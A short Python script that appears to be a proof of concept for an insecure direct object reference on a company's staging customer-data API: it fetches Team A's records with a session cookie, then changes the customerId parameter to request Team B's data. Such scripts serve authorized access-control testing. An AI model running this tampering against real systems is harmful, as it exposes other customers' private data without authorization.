import requests

# Example API endpoint for customer data retrieval
api_url = "https://staging.gearset.com/api/customerData"

# Initialize a session to simulate a logged-in user from Team A.
session = requests.Session()

# Set a valid session cookie (replace with a real cookie for authorized testing)
session.cookies.set('sessionid', 'valid_session_cookie_for_TeamA')

# Step 1: Legitimate access for Team A
response_team_a = session.get(api_url, params={'customerId': 'TeamA'})
print("Team A Data Response:")
print(response_team_a.text)

# Step 2: Parameter tampering attempt to access Team B's data
response_team_b = session.get(api_url, params={'customerId': 'TeamB'})
print("Team B Data Response:")
print(response_team_b.text)
